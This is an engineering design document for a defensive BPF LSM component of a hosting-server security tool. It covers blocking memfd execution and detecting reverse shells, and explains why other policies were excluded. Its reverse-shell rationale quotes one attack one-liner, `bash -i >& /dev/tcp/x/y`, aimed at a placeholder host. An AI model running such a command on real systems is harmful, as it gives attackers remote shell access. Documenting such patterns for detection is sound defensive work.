# cfm-lsm — Userspace Behaviour Enforcement (scoped MVP)

## Status

Design phase. Not implemented.

This document supersedes an earlier broader draft that proposed a
fifteen-policy BPF LSM component spanning exec, credential, filesystem,
network, rate-limit, self-protection, and observability rules. After
evaluating that draft against the actual CFM tree and the production
stacks CFM targets (cPanel + CloudLinux + KernelCare, DirectAdmin +
CloudLinux + KernelCare, Proxmox Debian KVM ZFS), most of the proposed
catalogue duplicated protections already provided by CageFS, LVE,
Imunify360 Proactive Defense, `kernsec`, and `internal/outbound/`, and
a few policies actively conflicted with the rest of the stack (notably
KernelCare/Ksplice module reloads vs the proposed module-load lockdown,
and Yama `ptrace_scope=1` already shipped by `kernsec` vs the proposed
ptrace LSM rule).

The scope here is intentionally narrow: exactly two LSM policies,
`CFML-EXEC-001` and `CFML-EXEC-003`. Nothing is deferred, nothing is on
a watch-list. Anything beyond those two requires a separate, named
proposal — not a TODO inside this doc.

The implementation shape is also fixed: an in-binary subsystem of the
existing CFM daemon at `internal/lsm/`, loading CO-RE BPF LSM programs
via [`cilium/ebpf`](https://github.com/cilium/ebpf). No separate
daemon, no kernel module, no DKMS, no clang on the customer host. CFM
stays `CGO_ENABLED=0`. See the Architecture section for details.

## Overview

`cfm-lsm` is the CFM component that catches the post-exploit consequences
of a successful userspace compromise: a webshell that drops a payload and
tries to execute it from memory, or a hijacked process that pivots into a
reverse shell. These behaviours are invisible to the other CFM layers —
`webdetector` has already returned by the time exec happens, and
`kernsec` operates on preemptive surface reduction (sysctls, boot
arguments, module blacklists, mount audit) rather than runtime decisions.

`cfm-lsm` deliberately is not a generic syscall observer (that is
Tetragon's design space, not CFM's); not a replacement for CageFS, LVE,
or Imunify360 (it sits alongside them); and not an outbound network
policy engine — that work belongs in the existing per-uid NFLOG path
in `internal/outbound/`, which is already designed for exactly that
problem and works on EL8 without DKMS.

## Position in the CFM stack

```
HTTP layer        webdetector       (inbound request analysis, vhost policy,
                                     challenge/block via nftables)
                       ↓
Userspace layer   cfm-lsm           (process behaviour: memfd exec,
                                     reverse shell pattern)
                       ↓
Kernel layer      kernsec           (sysctls, boot args, modules, fstab —
                                     preemptive surface reduction)
```

Each layer detects what the others cannot. `cfm-lsm` occupies the
narrow band between "the HTTP request that caused the compromise" and
"the kernel-surface that the operator already removed" — specifically,
the moment a compromised process tries to do the thing the attacker
came for.

## Scope rationale

The original draft listed fifteen policies; this design ships two.
Every other ID from that draft is excluded for a specific reason — not
deferred, excluded — because some other layer in CFM's expected stack
already covers it, or because the policy actively conflicts with
something else CFM relies on.

| Policy | Decision | Reason |
|---|---|---|
| `CFML-EXEC-001` (memfd exec) | **In, enforce** | High-signal, low-FP; Imunify PD cannot see past the PHP→child process boundary; no other CFM layer covers this. |
| `CFML-EXEC-003` (reverse shell pattern) | **In, monitor → enforce** | Behavioural detection; covers ground Imunify PD blocks at *launch* but cannot catch *post-spawn*; no other CFM layer covers this. |
| `CFML-EXEC-002` (Trusted Path Execution) | **Out** | High FP from composer / npm / pip / wp-cli; CageFS + Imunify PD + `kernsec`'s `noexec` mount audit already cover the realistic vector. |
| `CFML-OBS-001` (ptrace lockdown) | **Out — already covered by `kernsec`** | `kernel.yama.ptrace_scope=1` is shipped today by `kernsec` (see `internal/kernsec/profile.go:188`). If stricter is wanted, ship `=2` as a `kernsec` Tier 2 sysctl rule — no new code, no new LSM hook. |
| `CFML-NET-001` (outbound per vhost) | **Out — wrong component** | `internal/outbound/analyzer.go` already does per-uid NFLOG-based outbound observation. Promoting that path to enforce + per-vhost policy is the right home for this; it works on EL8 with no DKMS and reuses an existing event pipeline. |
| `CFML-FS-001`, `CFML-SELF-001`, `CFML-CRED-*`, `CFML-RATE-*`, `CFML-SELF-002`, `CFML-FS-002`, `CFML-FS-003` | **Out** | Each is covered by an existing layer: CageFS for FS-write vectors on caged users, LVE for fork/rate, `kernsec` for module surface (and `CFML-SELF-002` would actively conflict with KernelCare/Ksplice live-patch module reloads), webdetector for webshell-drop correlation. If any one of these later proves necessary it will be added in a separate, named proposal — not as an open TODO in this doc. |

## Stack-specific notes

**cPanel + CloudLinux + KernelCare.** Full MVP applies. Per-user CageFS
already namespaces PHP-FPM workers away from the FS-write vectors the
excluded `CFML-FS-*` policies aimed at, which is why those stay out.
KernelCare's live-patch module loads post-boot, but the MVP does not
constrain module loading at all, so there is nothing to whitelist.

**DirectAdmin + CloudLinux + KernelCare.** Same as cPanel.

**Proxmox Debian KVM ZFS.** Hypervisor hosts run essentially no PHP
workload, so the value of `cfm-lsm` collapses to "catch a reverse shell
or memfd exec on the hypervisor itself." That is still worth doing on
hosts with administrative SSH exposure, but the default should be
host-profile-aware: `cfm-lsm` either disabled by default on detected
hypervisors, or restricted to `CFML-EXEC-001` alone. The host-profile
signal already exists in `internal/kernsec/profile.go` (Proxmox is
already a recorded host context); `cfm-lsm` should consume it rather
than reinvent the detection.

## Policy catalogue — MVP

### `CFML-EXEC-001` — Block exec from memfd

| | |
|---|---|
| Hook | `bprm_check_security` |
| Default mode | `enforce` |
| FP risk | Very low |
| Perf impact | Negligible (exec is not a hot path) |

**Description.** Refuse `execve` when the `bprm`'s backing file has no
on-disk path — i.e. when it is anonymous shmem from `memfd_create` or
equivalent. The mechanism in BPF is to inspect `bprm->file`, check that
the superblock magic is `TMPFS_MAGIC`, and that the dentry has no
linked path. If both hold, return `-EPERM`.

**Rationale.** `memfd_create` + `execve` is the canonical fileless
payload pattern. It is the next step after a webshell finishes
downloading a binary into memory, and it is the technique most
post-exploit kits reach for once they realise the disk is monitored.
Legitimate uses on hosting servers are vanishingly rare. The
signal-to-noise ratio of this single rule is higher than any other
behaviour-detection rule in the original fifteen-policy draft.

**Exemptions.** uid 0 with a TTY (interactive root); a configured
parent-process whitelist for legitimate build tooling that genuinely
needs it; an optional per-host opt-out for podman / systemd-nspawn on
Proxmox hypervisors that legitimately exec from anonymous fds during
container start.

**Notes.** Exec is a cold path. Perf overhead is invisible. This is
the rule to ship first, monitor briefly, and promote to enforce.

### `CFML-EXEC-003` — Reverse shell pattern

| | |
|---|---|
| Hook | `bprm_check_security` (with optional follow-up at `task_alloc`) |
| Default mode | `monitor` for 30 days, then `enforce` |
| FP risk | Low |
| Perf impact | Negligible |

**Description.** At `bprm_check`, walk the task's fd table for fds
0, 1, and 2. For each, check whether it is socket-backed and whether
the socket is connected to a remote peer — not a pty, not a unix-domain
socket to a local service, not a regular file. A process about to exec
with all three of stdin / stdout / stderr dup'd to a connected remote
socket is a reverse shell, regardless of which binary it is (`bash`,
`nc`, `socat`, `python -c`, `perl -e`, obfuscated one-liners).

**Rationale.** Behavioural detection, not binary match. Imunify PD
blocks the *call* that launches `bash -i >& /dev/tcp/x/y`; this rule
catches the resulting `bash` process *being* a reverse shell. The two
layers are complementary: PD covers the PHP-originating launch,
`cfm-lsm` covers the spawned process. The combination is robust against
the most common evasion of PD (using the launcher binary directly,
without going through `exec`/`system`/`shell_exec` in PHP first).

**Exemptions.** uid 0 (root reverse shells are an administrative
choice, not an attack vector to enforce against). An explicit per-host
list for any legitimate inetd-style services that genuinely dup socket
fds onto 0/1/2 — these are rare on hosting boxes.

**Notes.** The fd walk is the implementation cost driver and the
verifier-complexity risk on older RHEL 9 kernels. The hot loop must be
bounded (cap at fd ≤ 2) and the socket-state read must use existing CO-RE
relocations rather than custom field offsets. Budget verifier complexity
explicitly before committing the design to that hook layout.

## Out of scope (with rationale)

For each excluded policy ID, one short paragraph on what already covers
that ground. Reviewers and future maintainers will read this section
first when they ask "why doesn't `cfm-lsm` do X." These are permanent
decisions, not TODOs.

- **`CFML-EXEC-002` (TPE).** Composer, npm, pip, yarn, wp-cli, drush,
  and cPanel's own auto-installer all legitimately exec from per-user
  writable directories. The FP surface is wide and the whitelist
  becomes a permanent tuning treadmill. The realistic vector this rule
  targets (PHP execs `/tmp/dropped-binary`) is already covered by
  Imunify PD at the PHP layer, by CageFS at the FS layer on
  CloudLinux, and by `kernsec`'s `/tmp`, `/var/tmp`, `/dev/shm`
  `noexec` mount audit at the kernel layer. Adding a fourth layer for
  the same vector is not worth the operational cost.

- **`CFML-OBS-001` (ptrace lockdown).** `kernsec` already ships
  `kernel.yama.ptrace_scope=1` in its default Tier 1 ruleset
  (`internal/kernsec/profile.go:188`). Yama scope 1 already restricts
  non-root processes to ptracing only their own children — which is
  exactly the behaviour this LSM rule would have enforced. If a host
  wants the stricter "non-root cannot ptrace at all" semantics, the
  right answer is to add `kernel.yama.ptrace_scope=2` as a `kernsec`
  Tier 2 sysctl rule. One line of config, no new kernel hook.

- **`CFML-NET-001` (outbound per vhost).** `internal/outbound/`
  already implements per-uid NFLOG-based outbound observation
  (`internal/outbound/analyzer.go`) with sliding-window thresholds for
  SMTP, scan, and HTTP, with forensic enrichment and deduplication.
  The right way to deliver per-vhost outbound enforcement is to
  promote that existing path from observe to enforce, not to bolt a
  parallel BPF LSM implementation onto a different hook surface. As a
  bonus the NFLOG path works on EL8 without DKMS.

- **`CFML-FS-001` (SSH backdoor injection).** Genuinely valuable on
  paper, but on the stacks CFM targets the realistic attacker (a
  compromised PHP-FPM worker) is already inside CageFS on a CloudLinux
  host and physically cannot see `~/.ssh/authorized_keys` for
  arbitrary users. Non-caged users — rare on a typical cPanel /
  DirectAdmin deployment — would benefit, but not enough to justify
  the FS-hook implementation cost as a standalone CFM rule. If this
  ever becomes necessary it deserves its own proposal.

- **`CFML-FS-002` (cron persistence).** Same logic as `CFML-FS-001`.
  CageFS already prevents the realistic attacker from writing to cron
  paths.

- **`CFML-FS-003` (web-root suspicious file creation).** The
  correlation value (`.php` dropped within 30s of suspicious POST)
  belongs in `webdetector`, not in an LSM hook. The LSM hook would
  only generate the event; the decision logic is HTTP-layer
  correlation.

- **`CFML-CRED-001`, `CFML-CRED-002` (credential / capability
  watch).** LVE and CageFS already constrain the realistic
  per-user credential surface on CloudLinux. The remaining ground
  (root-equivalent cred mutation by non-setuid paths) overlaps with
  what an LKRG-class kernel integrity tool would cover; CFM does not
  ship that layer, so adding a BPF LSM half-measure is the wrong
  shape.

- **`CFML-RATE-001`, `CFML-RATE-002` (segfault / fork rate
  throttling).** LVE owns per-user resource limits on CloudLinux. On
  non-CloudLinux hosts these would have value, but not enough to
  justify carrying the rate-limit machinery for two different host
  classes.

- **`CFML-SELF-001` (CFM self-protection).** Worth doing one day, but
  not via a BPF LSM hook in this MVP. A `fanotify` watch on the CFM
  binary / config tree is a much cheaper way to get the same signal,
  and `cfm-lsm` does not yet exist on disk for there to be anything
  to protect at the LSM layer.

- **`CFML-SELF-002` (module load lockdown post-boot).** Actively
  conflicts with KernelCare and Ksplice live-patch module loads,
  which are a core part of the CFM target stack. Implementing this
  rule would require maintaining a whitelist of every live-patch
  module suffix in perpetuity, which is brittle. `kernsec` already
  explicitly leaves `kernel.modules_disabled` unsupported for
  related reasons.

## Prior art — what to borrow (and what not to)

Two projects are routinely cited as references for a
userspace-behaviour LSM: Falco and grsecurity / PaX. Both are useful as
background reading, but neither is a code source for CFM.

### Falco

What is reusable: Falco's **public rule corpus**. Their existing rules
`Memfd Create Then Execute` and `Reverse Shell` cover exactly the two
behaviours of this MVP. Their detection logic — memfd-backed exec via
inode and dentry inspection, reverse-shell via fd 0/1/2 socket-dup
walking — is the same shape this design lands on independently. The
practical value is in the exemption sets Falco has accumulated over
many production hosts: which build tools legitimately exec from memfd,
which container runtimes dup socket fds. Read the rules, lift the
exemption lists as a starting point, reimplement the detection
clean-room against BPF LSM hooks.

What is not reusable: Falco's **engine and runtime**. Falco is a
general-purpose syscall observability platform built on libsinsp /
libscap, with a full YAML rules language and its own driver story.
CFM's two-policy scope does not justify importing that dependency
surface. The relationship is "borrow the detections, not the
framework."

Licensing: Falco is Apache-2.0; rule strings can be referenced as
prior art in commits and documentation but no Falco code is vendored.

### grsecurity / PaX

What is reusable: **concepts and published documentation only**. TPE
(Trusted Path Execution) is a grsec concept, and the way grsec frames
exec-from-writable-paths is part of why this design concludes
`CFML-EXEC-002` is *not* worth reimplementing on a CageFS / Imunify
stack. Public papers on PaX exec restrictions and the older grsec
wiki are useful background for the `CFML-EXEC-001` exemption model.

What is not reusable: **code or patches**. grsec has been
commercial-only since 2017 and the upstream PaX patches are no longer
maintained for current kernels. There is no legal or practical path
to lift implementation from grsec.

Relationship to `kernsec`: most of grsec's hardening philosophy maps
onto sysctls, boot arguments, module blacklists, and mount audits —
which is what `kernsec` already does (see `docs/kernsec.md`).
`cfm-lsm` does not duplicate that ground.

## Related future work

A complementary future component — a CFM-built Zend PHP extension that
intercepts dangerous PHP function calls at the VM layer, for hosts
without Imunify360 Proactive Defense — is described separately in
[`cfm-php.md`](./cfm-php.md). It is out of scope for `cfm-lsm` because
it operates at a different layer (PHP Zend VM, not kernel LSM hooks)
and is a different project on a different timeline. It is recorded
here only to answer the inevitable "why doesn't `cfm-lsm` block
dangerous PHP functions directly?" That work, if it happens, lives in
`cfm-php`, not here.

## Architecture

The implementation details below are sketches, not commitments. They
exist so a future implementer has a sane starting point, not so this
doc becomes a blocker on choosing a different approach later.

The shape is deliberately **not** "separate C daemon + DKMS module +
log file that CFM tails." That model would be the only CFM component
to work that way, would require running clang on every customer host,
and would invite the version-skew and IPC problems that come with a
second binary. Instead, `cfm-lsm` follows the same in-binary subsystem
pattern as `internal/outbound/` and `internal/kernsec/`.

### Backend

BPF LSM via CO-RE, loaded by the existing CFM Go daemon using
[`cilium/ebpf`](https://github.com/cilium/ebpf). No libbpf C
dependency on the runtime side; no kernel module; no DKMS. EL8 is
explicitly unsupported for `cfm-lsm`; EL8 hosts continue to rely on
`kernsec`, the existing `internal/outbound/` sentinel, and Imunify
(where licensed). Maintaining a DKMS LKM backend across
KernelCare-patched RHEL 8 kernels would be a perpetual maintenance
tax this MVP does not pay.

### Build model — no CGO, no clang on the install target

CFM builds with `CGO_ENABLED=0` (see `Makefile:53`). That stays true
for `cfm-lsm`. The mechanics:

- The BPF C sources live in-tree at `internal/lsm/bpf/*.bpf.c` with a
  CO-RE `vmlinux.h`.
- `go generate` invokes
  [`bpf2go`](https://github.com/cilium/ebpf/tree/main/cmd/bpf2go) from
  `cilium/ebpf`, which calls clang to produce the compiled BPF object
  plus Go bindings that wrap it.
- The compiled `.o` and the generated Go bindings are **committed to
  the repo**. `go build` does not call clang; it just embeds the
  pre-compiled bytecode via `go:embed`.
- `CGO_ENABLED=0` continues to work because `cilium/ebpf` is pure Go
  — it talks to the kernel via `bpf(2)` syscalls through
  `golang.org/x/sys/unix`, not via libbpf.
- The Go runtime loads the embedded bytecode, CO-RE-relocates it for
  the running kernel, and attaches it to LSM hooks. No clang on the
  customer host. No kernel headers on the customer host.

Build-time deps for **contributors who change the BPF programs**
(documented in a `## Building` section, separate from runtime
install): clang ≥ 11, libelf-dev, kernel headers ≥ 5.7 for
`vmlinux.h` regeneration, optionally `bpftool` for debugging.

Build-time deps for **everyone else** (downstream packagers,
end-user installs, CI that doesn't touch `.bpf.c`): none beyond
what CFM already needs.

### In-tree layout

```
internal/lsm/
├── lsm.go               # subsystem lifecycle: attach, detach, ring read loop
├── policy.go            # /etc/cfm/lsm.conf parser (INI, same shape as kernsec.conf)
├── events.go            # event types, fed into the existing CFM event bus
├── cli.go               # `cfm lsm status`, `cfm lsm policy <id>`, etc.
├── bpf/
│   ├── memfd_exec.bpf.c # CFML-EXEC-001 BPF LSM program
│   ├── revshell.bpf.c   # CFML-EXEC-003 BPF LSM program
│   ├── common.bpf.h     # shared helpers, map definitions, event struct
│   └── vmlinux.h        # CO-RE kernel type definitions (committed)
├── bpf_bpfel.go         # bpf2go-generated bindings (committed)
├── bpf_bpfel.o          # bpf2go-compiled BPF object (committed)
└── doc.go
```

### Runtime — single daemon, single unit, single config

A subsystem inside the existing CFM daemon, not a separate
`cfm-lsmd` process. The reasoning: BPF event delivery is in-process
already (the ringbuf reader is a goroutine), LSM event processing
is not crash-prone enough to justify a second daemon, and the
host-profile detection code lives in the existing binary already
(`internal/kernsec/profile.go`). Reuse, don't fork.

There is no "cfm-lsmd writes a log file that cfm watches" seam.
Events flow from the ringbuf reader goroutine onto the same
in-process channel that `internal/outbound/` already feeds into the
notify, JSON-log, and webdetector-correlation paths.

A single systemd unit (the existing `cfm.service`). A single config
file. A single log destination (`/var/log/cfm/lsm.jsonl`).

### Privileges

BPF LSM loading needs `CAP_BPF` + `CAP_PERFMON` + `CAP_SYS_ADMIN`.
The CFM daemon already runs with the privileges it needs for
nftables and NFLOG (see `configs/cfm.service` for the existing
hardening profile); the additional caps required for BPF LSM
attach are within the same envelope and do not require a privilege
boundary split. If a future iteration of CFM ever drops the main
daemon to a lower-cap user, the cleanest split is a small one-shot
`cfm-lsm-loader` helper that attaches programs at start and exits
— not a long-running second daemon. That is a refinement for later,
not part of the MVP.

### Host-profile reuse

Consume the existing detection in `internal/kernsec/profile.go`
(cPanel, DirectAdmin, CloudLinux / LVE, CageFS, Imunify360,
KernelCare, Ksplice, Proxmox, ZFS, EFI). Do not reimplement
detection.

### Event shape

Match the per-uid event shape that `internal/outbound/analyzer.go`
already emits, so downstream pipeline code can consume both sources
symmetrically. The BPF programs write a minimal fixed-size struct
into a per-CPU ringbuf; the Go side enriches it (pid → cgroup → user
→ vhost) before forwarding to the event bus.

### Config

`/etc/cfm/lsm.conf`, INI-style, same format as
`/etc/cfm/kernsec.conf`. The earlier draft proposed TOML; align with
the existing format in the rest of CFM instead. Three modes per
policy: `disabled`, `monitor`, `enforce`. Per-vhost overrides are
reserved for future use; the two MVP policies are not vhost-keyed
and do not need them.

The `enforce` vs `monitor` decision is **compiled into the BPF
program at load time** via a `bpf2go` constant rewrite, so the hot
path does not branch on the mode and runtime cost is identical in
both modes.

## Coexistence

**Imunify360 Proactive Defense.** Imunify PD is a Zend extension
hooking `zend_execute_ex` / `zend_execute_internal`; it sees PHP VM
calls only. `cfm-lsm` operates at LSM hooks one layer below; they are
complementary, not redundant. PD blocks the call that launches a
reverse shell; `cfm-lsm` blocks the resulting process if PD missed it
or was not loaded into that SAPI. The forward-looking analogue of
Imunify PD for non-Imunify hosts has its own design doc — see
[`cfm-php.md`](./cfm-php.md).

**CageFS / LVE.** CageFS namespaces away most FS-write vectors for
PHP-FPM workers on CloudLinux; the MVP policies (`CFML-EXEC-001`,
`CFML-EXEC-003`) are CageFS-orthogonal and do not duplicate it. LVE's
fork / PMEM / EP limits are not touched.

**KernelCare / Ksplice.** Live-patch modules load post-boot. The MVP
does not constrain module loading at all, so there is nothing to
whitelist. (This is one of the reasons `CFML-SELF-002` is out of
scope.)

**Stacked LSMs (SELinux / AppArmor / Yama / Lockdown).** The Linux LSM
stack runs each LSM in sequence; any LSM can deny, all must permit.
SELinux or AppArmor, where present, runs before `cfm-lsm`; their
denials never reach this layer. Yama runs alongside;
`kernel.yama.ptrace_scope=1` is already shipped by `kernsec`. Lockdown
runs alongside and is recommended at `integrity` but not required.
Tomoyo and Smack are untested and not on CFM's supported distros.

## Phased roadmap

Two phases, both about the same two policies.

**Phase 1 — MVP, monitor mode.** Stand up `internal/lsm/` with the
two BPF C sources at `internal/lsm/bpf/`, the `bpf2go` `go generate`
wiring, the committed compiled object and Go bindings. Attach
`CFML-EXEC-001` and `CFML-EXEC-003` in monitor mode. Build the
`/etc/cfm/lsm.conf` parser and the `cfm lsm status` / `cfm lsm
preview` CLI surface. Wire events into the existing webdetector
decision pipeline. Document the contributor-side build deps (clang,
libelf, kernel headers) in a new `## Building cfm-lsm BPF objects`
section that is explicit that those deps are **not** required for
`go build` of CFM itself. Run 30 days of telemetry on a representative
cPanel host and a representative Proxmox host before any enforcement.

**Phase 2 — Promote to enforce.** `CFML-EXEC-001` to `enforce` once
Phase 1 telemetry confirms zero or near-zero legitimate triggers.
`CFML-EXEC-003` to `enforce` once the FP rate is verified against
Phase 1 telemetry — likely later than `EXEC-001` because of the
behavioural fd walk.

There is no Phase 3 in this doc. New policies require a new proposal.
The earlier draft's Phases 3–5 (network policy, hardening, EL8 LKM
backport) are explicitly removed: `CFML-NET-001` belongs in
`internal/outbound/`, hardening is already `kernsec`'s remit, and an
EL8 LKM is a maintenance trap on KernelCare-patched kernels.

## Open questions

1. **cgroup → vhost resolution under CloudLinux LVE.** LVE entities
   are not stock cgroups v2. The MVP does not depend on per-vhost
   resolution (neither MVP policy is vhost-keyed), but any later
   proposal that adds a vhost-keyed policy will hit this first and
   should plan for it.

2. **Policy hot-reload via dual-attach / atomic swap.** Standard BPF
   pattern (load new program, atomically swap link, detach old), but
   needs explicit design before Phase 2 so reloads do not drop
   in-flight events or briefly leave the system unprotected.

3. **BPF LSM availability on CloudLinux 9 and CloudLinux 10
   kernels.** Verify on real CL-patched kernels before committing
   build targets. CL tracks RHEL but with vendor patches that
   occasionally lag or skip BPF subsystem updates.

## References

- [`docs/kernsec.md`](./kernsec.md) — preemptive kernel-surface
  reduction (sibling component).
- [`docs/webdetector-history-design.md`](./webdetector-history-design.md)
  — upstream consumer of LSM events.
- [`cfm-php.md`](./cfm-php.md) — future complementary component
  (PHP Zend extension), separate project.
- `internal/outbound/analyzer.go` — existing per-uid NFLOG outbound
  observer; rightful owner of the network-policy problem space.
- `internal/kernsec/profile.go` — host-profile detection reused by
  `cfm-lsm`. See line 188 for the `kernel.yama.ptrace_scope=1`
  default that subsumes the original draft's `CFML-OBS-001`.
- BPF LSM kernel docs: `Documentation/bpf/prog_lsm.rst`.
